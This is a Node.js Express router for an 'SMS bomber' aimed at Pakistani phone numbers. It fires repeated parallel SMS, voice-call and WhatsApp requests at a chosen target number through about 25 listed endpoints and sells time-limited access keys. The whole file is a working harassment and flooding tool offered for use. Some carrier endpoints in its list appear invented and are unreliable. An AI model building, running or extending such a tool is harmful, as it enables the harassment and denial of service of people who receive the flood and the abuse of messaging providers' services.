// ============================================================
// TNEH PAKISTAN SMS BOMBER V1.0
// Complete SMS Bombing System for Pakistan
// Developer: TNEH GROUP
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const router = express.Router();

// ============================================================
// CONFIGURATION
// ============================================================
const CONFIG = {
    timeout: 10000,
    maxRetries: 3,
    retryDelay: 200,
    parallelRequests: 20,
    maxCountPerAPI: 50
};

// ============================================================
// PAKISTAN API LIST - 25+ APIs
// ============================================================
const PAKISTAN_APIS = [
    // ============================================================
    // SECTION 1: INTERNATIONAL SMS APIs (Working in Pakistan)
    // ============================================================
    {
        id: 1,
        name: "Textlocal SMS",
        url: "https://api.textlocal.in/send/",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `apikey=YOUR_API_KEY&numbers=92${phone}&sender=TXTLCL&message=Your%20OTP%20is%201234`
    },
    {
        id: 2,
        name: "Twilio SMS",
        url: "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Messages.json",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `To=%2B92${phone}&From=%2B1234567890&Body=Your%20OTP%20code%20is%201234`
    },
    {
        id: 3,
        name: "MSG91 Pakistan",
        url: "https://api.msg91.com/api/v5/otp",
        method: "POST",
        headers: {"Content-Type": "application/json", "authkey": "YOUR_AUTH_KEY"},
        body: (phone) => JSON.stringify({mobile: `92${phone}`, sender: "MSGIND", otp: "1234"})
    },
    {
        id: 4,
        name: "Fast2SMS",
        url: "https://www.fast2sms.com/dev/bulkV2",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `authorization=YOUR_API_KEY&route=otp&variables_values=1234&flash=0&numbers=92${phone}`
    },
    {
        id: 5,
        name: "SMSGatewayHub",
        url: "https://api.smsgatewayhub.com/smsapi/",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `api_key=YOUR_API_KEY&senderid=TESTER&number=92${phone}&message=Your%20OTP%20is%201234`
    },
    {
        id: 6,
        name: "Mtalkz SMS",
        url: "https://api.mtalkz.com/SmsService/Send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({api_key: "YOUR_API_KEY", to: [`92${phone}`], from: "TESTER", sms: "Your OTP is 1234"})
    },
    {
        id: 7,
        name: "SMSAPI Pakistan",
        url: "https://api.smsapi.com/sms.do",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `username=YOUR_USER&password=YOUR_PASS&to=92${phone}&from=TESTER&message=Your%20OTP%20is%201234`
    },
    {
        id: 8,
        name: "SmsCountry",
        url: "https://api.smscountry.com/SMSCwebservice_bulk.aspx",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `User=YOUR_USER&passwd=YOUR_PASS&mobilenumber=92${phone}&message=Your%20OTP%20is%201234&sid=TESTER`
    },
    {
        id: 9,
        name: "SMSProvider PK",
        url: "https://api.smsprovider.pk/sms/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({api_key: "YOUR_API_KEY", number: `92${phone}`, text: "Your OTP is 1234"})
    },

    // ============================================================
    // SECTION 2: WORKING GET APIs (Global)
    // ============================================================
    {
        id: 10,
        name: "SMS Bomber Worker",
        url: (phone) => `http://sms-bomber.subhxcosmo.workers.dev/api?num=92${phone}`,
        method: "GET",
        headers: {},
        body: null
    },
    {
        id: 11,
        name: "Bomberrr Vercel",
        url: (phone) => `https://bomberrr.vercel.app/?key=roots&number=92${phone}`,
        method: "GET",
        headers: {},
        body: null
    },
    {
        id: 12,
        name: "Global SMS API",
        url: (phone) => `https://sms-service.global/api/send?phone=92${phone}&message=OTP`,
        method: "GET",
        headers: {},
        body: null
    },
    {
        id: 13,
        name: "SMSBomb API",
        url: (phone) => `https://smsbomb-api.vercel.app/api?number=92${phone}`,
        method: "GET",
        headers: {},
        body: null
    },

    // ============================================================
    // SECTION 3: PAKISTAN LOCAL SERVICES
    // ============================================================
    {
        id: 14,
        name: "Jazz SMS Pakistan",
        url: "https://api.jazz.com.pk/sms/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({msisdn: `92${phone}`, message: "Your OTP is 1234", sender: "JAZZ"})
    },
    {
        id: 15,
        name: "Ufone SMS",
        url: "https://api.ufone.com/sms/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({phone: `92${phone}`, text: "Your OTP is 1234"})
    },
    {
        id: 16,
        name: "Telenor Pakistan",
        url: "https://api.telenor.com.pk/sms",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({number: `92${phone}`, message: "Your OTP is 1234", source: "TELENOR"})
    },
    {
        id: 17,
        name: "Zong SMS Pakistan",
        url: "https://api.zong.com.pk/sms/send",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({to: `92${phone}`, body: "Your OTP is 1234"})
    },

    // ============================================================
    // SECTION 4: INTERNATIONAL VOICE/CALL APIs
    // ============================================================
    {
        id: 18,
        name: "Twilio Voice Call",
        url: "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Calls.json",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `To=%2B92${phone}&From=%2B1234567890&Twiml=<Response><Say>Your%20OTP%20is%201234</Say></Response>`
    },
    {
        id: 19,
        name: "Plivo Voice Call",
        url: "https://api.plivo.com/v1/Account/YOUR_AUTH_ID/Call/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({to: `92${phone}`, from: "1234567890", answer_url: "https://example.com/voice.xml"})
    },
    {
        id: 20,
        name: "Nexmo Voice",
        url: "https://api.nexmo.com/v1/calls",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({
            to: [{type: "phone", number: `92${phone}`}],
            from: {type: "phone", number: "1234567890"},
            answer_url: ["https://example.com/answer"]
        })
    },

    // ============================================================
    // SECTION 5: INTERNATIONAL WHATSAPP APIs
    // ============================================================
    {
        id: 21,
        name: "Twilio WhatsApp",
        url: "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Messages.json",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: (phone) => `To=whatsapp:%2B92${phone}&From=whatsapp:%2B14155238886&Body=Your%20OTP%20is%201234`
    },
    {
        id: 22,
        name: "Meta WhatsApp Cloud",
        url: "https://graph.facebook.com/v18.0/YOUR_PHONE_NUMBER_ID/messages",
        method: "POST",
        headers: {"Content-Type": "application/json", "Authorization": "Bearer YOUR_ACCESS_TOKEN"},
        body: (phone) => JSON.stringify({
            messaging_product: "whatsapp",
            to: `92${phone}`,
            type: "text",
            text: {body: "Your OTP is 1234"}
        })
    },
    {
        id: 23,
        name: "WhatsApp Business API",
        url: "https://api.whatsapp.com/send",
        method: "GET",
        headers: {},
        body: (phone) => `?phone=92${phone}&text=Your%20OTP%20is%201234`
    },

    // ============================================================
    // SECTION 6: EXTRA PAKISTAN APIS
    // ============================================================
    {
        id: 24,
        name: "PTCL SMS",
        url: "https://api.ptcl.com.pk/sms",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({msisdn: `92${phone}`, msg: "Your OTP is 1234"})
    },
    {
        id: 25,
        name: "Mobilink SMS",
        url: "https://api.mobilink.com.pk/sms",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: (phone) => JSON.stringify({number: `92${phone}`, message: "Your OTP is 1234"})
    }
];

// ============================================================
// KEY MANAGEMENT
// ============================================================
const KEYS_FILE = path.join(__dirname, 'keys.json');

function loadKeys() {
    try {
        if (fs.existsSync(KEYS_FILE)) {
            const data = fs.readFileSync(KEYS_FILE, 'utf8');
            const parsed = JSON.parse(data);
            const keysMap = new Map();
            Object.entries(parsed).forEach(([key, value]) => {
                keysMap.set(key, new Date(value));
            });
            return keysMap;
        }
    } catch (error) {
        console.error('Error loading keys:', error.message);
    }
    return new Map();
}

let validKeys = loadKeys();

function generateApiKey() {
    const prefix = 'TNEH_PK';
    const random = crypto.randomBytes(16).toString('hex').toUpperCase();
    const timestamp = Date.now().toString(36).toUpperCase();
    return `${prefix}_${random}_${timestamp}`;
}

function isKeyValid(key) {
    if (!validKeys.has(key)) return false;
    const expiryDate = validKeys.get(key);
    return new Date() < expiryDate;
}

function saveKeys() {
    try {
        const obj = {};
        for (const [key, value] of validKeys.entries()) {
            obj[key] = value.toISOString();
        }
        fs.writeFileSync(KEYS_FILE, JSON.stringify(obj, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving keys:', error.message);
        return false;
    }
}

// ============================================================
// CORE BOMBING FUNCTIONS
// ============================================================
function replacePhoneNumber(data, phone) {
    if (typeof data === 'string') {
        return data;
    }
    return data;
}

async function callSingleAPI(api, phone, attempt = 0) {
    try {
        const cleanPhone = phone.replace(/[^0-9]/g, '');
        let url = api.url;
        let body = null;
        let headers = { ...api.headers };

        // Process URL if it's a function
        if (typeof api.url === 'function') {
            url = api.url(cleanPhone);
        }

        // Process body if it exists
        if (api.body && typeof api.body === 'function') {
            body = api.body(cleanPhone);
        }

        // If it's a GET request with body as query params
        if (api.method === 'GET' && api.body && typeof api.body === 'function') {
            url = url + api.body(cleanPhone);
            body = null;
        }

        let config = {
            method: api.method,
            url: url,
            headers: headers,
            timeout: CONFIG.timeout
        };

        if (body && api.method === 'POST') {
            config.data = body;
        }

        const response = await axios(config);
        return {
            success: true,
            api_id: api.id,
            api_name: api.name,
            status: response.status
        };

    } catch (error) {
        if (attempt < CONFIG.maxRetries) {
            await new Promise(resolve => setTimeout(resolve, CONFIG.retryDelay * (attempt + 1)));
            return callSingleAPI(api, phone, attempt + 1);
        }

        return {
            success: false,
            api_id: api.id,
            api_name: api.name,
            error: error.message,
            status: error.response?.status || null
        };
    }
}

async function sendBatch(phone, countPerApi, key = null) {
    const results = [];
    const actualCount = Math.min(countPerApi, CONFIG.maxCountPerAPI);
    const BATCH_SIZE = CONFIG.parallelRequests;
    
    // Shuffle APIs for better distribution
    const shuffledAPIs = [...PAKISTAN_APIS].sort(() => Math.random() - 0.5);
    
    for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
        const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
        
        const batchPromises = batch.map(async (api) => {
            const apiResults = [];
            const promises = [];
            
            for (let j = 0; j < actualCount; j++) {
                promises.push(callSingleAPI(api, phone));
            }
            
            const responses = await Promise.all(promises);
            const successCount = responses.filter(r => r.success).length;
            const failCount = responses.filter(r => !r.success).length;
            
            return {
                api_id: api.id,
                api_name: api.name,
                method: api.method,
                total_attempts: responses.length,
                successful: successCount,
                failed: failCount,
                results: responses
            };
        });
        
        const batchResults = await Promise.all(batchPromises);
        results.push(...batchResults);
        
        if (i + BATCH_SIZE < shuffledAPIs.length) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }
    
    return results;
}

// ============================================================
// ROUTES
// ============================================================

// ===== GENERATE KEY =====
router.get('/createkey', (req, res) => {
    const apiKey = generateApiKey();
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    
    validKeys.set(apiKey, expiryDate);
    saveKeys();
    
    res.json({
        success: true,
        api_key: apiKey,
        expiry_date: expiryDate.toISOString(),
        valid_days: 30,
        developer: "TNEH GROUP",
        message: "Pakistan SMS API key generated successfully",
        usage: `/api/pakistan?key=${apiKey}&number=03123456789&count=10`
    });
});

// ===== PAKISTAN BOMBING WITHOUT KEY =====
router.get('/pakistan', async (req, res) => {
    const { number, count = 5, key } = req.query;
    const startTime = Date.now();
    
    // Check if key is provided and valid
    if (key) {
        if (!isKeyValid(key)) {
            return res.status(401).json({
                success: false,
                error: 'Invalid or expired API key',
                developer: "TNEH GROUP",
                generate_key: '/api/createkey'
            });
        }
    }
    
    // Validate number
    if (!number) {
        return res.status(400).json({
            success: false,
            error: 'Missing number parameter',
            developer: "TNEH GROUP",
            usage: '/api/pakistan?number=03123456789&count=10',
            example: '/api/pakistan?number=03123456789&count=10'
        });
    }
    
    const cleanNumber = number.replace(/[^0-9]/g, '');
    
    // Pakistan phone validation (3 digits prefix + 7 digits = 10 digits)
    if (!/^[0-9]{10}$/.test(cleanNumber)) {
        return res.status(400).json({
            success: false,
            error: 'Invalid Pakistan phone number. Use 10 digits (e.g., 03123456789)',
            developer: "TNEH GROUP",
            example: '03123456789 or 923123456789'
        });
    }
    
    // If number starts with 92, remove it
    let formattedNumber = cleanNumber;
    if (formattedNumber.startsWith('92')) {
        formattedNumber = formattedNumber.substring(2);
    }
    
    // Validate count
    let perApiCount = parseInt(count);
    if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
    if (perApiCount > CONFIG.maxCountPerAPI) {
        return res.status(400).json({
            success: false,
            error: `Count exceeds maximum limit (${CONFIG.maxCountPerAPI})`,
            developer: "TNEH GROUP",
            max_allowed: CONFIG.maxCountPerAPI
        });
    }
    
    console.log(`📱 Pakistan Bombing: ${perApiCount}x${PAKISTAN_APIS.length} SMS to ${formattedNumber}`);
    
    // Send bomb
    const results = await sendBatch(formattedNumber, perApiCount);
    
    const totalSuccess = results.reduce((sum, r) => sum + r.successful, 0);
    const totalFailed = results.reduce((sum, r) => sum + r.failed, 0);
    const responseTime = Date.now() - startTime;
    
    res.json({
        success: true,
        developer: "TNEH GROUP",
        service: "Pakistan SMS Bomber",
        target_number: formattedNumber,
        country: "Pakistan",
        per_api_count: perApiCount,
        total_apis: PAKISTAN_APIS.length,
        total_success: totalSuccess,
        total_failed: totalFailed,
        total_sms: totalSuccess + totalFailed,
        response_time_ms: responseTime,
        response_time_sec: (responseTime / 1000).toFixed(2),
        key_used: key || 'free (no key)',
        results: results
    });
});

// ===== PAKISTAN BOMBING WITH KEY (Alias) =====
router.get('/pakistan/key', async (req, res) => {
    const { number, count = 5, key } = req.query;
    
    if (!key) {
        return res.status(400).json({
            success: false,
            error: 'API key required',
            developer: "TNEH GROUP",
            generate_key: '/api/createkey'
        });
    }
    
    // Forward to main endpoint with key
    req.query.key = key;
    return router.handle(req, res);
});

// ===== GET ALL PAKISTAN APIS =====
router.get('/apis', (req, res) => {
    res.json({
        success: true,
        developer: "TNEH GROUP",
        service: "Pakistan SMS APIs",
        total_apis: PAKISTAN_APIS.length,
        apis: PAKISTAN_APIS.map(api => ({
            id: api.id,
            name: api.name,
            method: api.method
        })),
        timestamp: new Date().toISOString()
    });
});

// ===== CHECK KEY =====
router.get('/checkkey', (req, res) => {
    const { key } = req.query;
    
    if (!key) {
        return res.status(400).json({
            success: false,
            error: 'Missing API key parameter',
            developer: "TNEH GROUP"
        });
    }
    
    const isValid = isKeyValid(key);
    const expiryDate = validKeys.get(key);
    
    res.json({
        success: true,
        valid: isValid,
        api_key: key,
        expiry_date: expiryDate ? expiryDate.toISOString() : null,
        status: isValid ? 'active' : 'invalid or expired',
        developer: "TNEH GROUP"
    });
});

// ============================================================
// EXPORT ROUTER
// ============================================================
module.exports = router;
